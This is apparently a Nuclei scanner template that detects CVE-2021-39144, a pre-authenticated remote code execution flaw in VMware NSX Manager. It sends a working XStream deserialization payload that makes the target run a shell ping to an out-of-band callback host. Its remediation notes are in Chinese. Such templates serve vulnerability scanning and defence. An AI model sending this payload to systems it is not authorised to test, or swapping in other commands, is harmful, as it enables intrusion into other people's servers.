id: vmware-nsx-stream-rce

info:
  name: VMware NSX Manager XStream Pre-authenticated - 远程代码执行漏洞
  author: _0xf4n9x_
  severity: high
  description: |
    该模板用于检测 VMware NSX Manager XStream Pre-authenticated - 远程代码执行漏洞。该类漏洞通常与危险接口暴露、命令参数拼接、模板解析、反序列化或组件缺陷有关，攻击者可能让服务端执行非预期代码。模板会向 `/api/2.0/services/usermgmt/password/{{lowerrstr}}` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可在目标服务权限范围内执行命令或代码，进而接管应用所在主机。
    - 成功利用后可能泄露配置、密钥和业务数据，并为横向移动、持久化控制或破坏业务提供入口。
  remediation: |
    - 升级受影响产品或组件到厂商修复版本，移除存在已知缺陷的依赖。
    - 限制高危接口的公网访问，增加认证、授权和来源校验，并避免将用户输入传入命令执行、模板解析或反序列化流程。
    - 排查异常进程、计划任务、WebShell、外联连接和新增账号，必要时轮换凭据并重建受影响环境。
  reference:
    - https://www.vmware.com/security/advisories/VMSA-2022-0027.html
    - https://kb.vmware.com/s/article/89809
    - https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html
    - https://attackerkb.com/topics/ngprN6bu76/cve-2021-39144
    - https://github.com/rapid7/metasploit-framework/pull/17222
  classification:
    cwe-id: CWE-78,CWE-502
  metadata:
    verified: true
    max-request: 2
    shodan-query: title:"VMware Appliance Management"
    fofa-query: title="VMware Appliance Management"
  tags: vmware,xstream,rce,msf,intrusive,vuln
variables:
  lowerrstr: "{{to_lower(rand_text_alpha(6))}}"

http:
  - raw:
      - |-
        PUT /api/2.0/services/usermgmt/password/{{lowerrstr}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <sorted-set>
          <string>foo</string>
          <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="java.beans.EventHandler">
              <target class="java.lang.ProcessBuilder">
                <command>
                  <string>bash</string>
                  <string>-c</string>
                  <string>ping {{os}}.{{interactsh-url}}</string>
                </command>
              </target>
              <action>start</action>
            </handler>
          </dynamic-proxy>
        </sorted-set>

    payloads:
      os:
        - '-c 3 lin'
        - '-n 3 win'
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: body
        words:
          - 'deceptive request routing'

      - type: status
        status:
          - 400
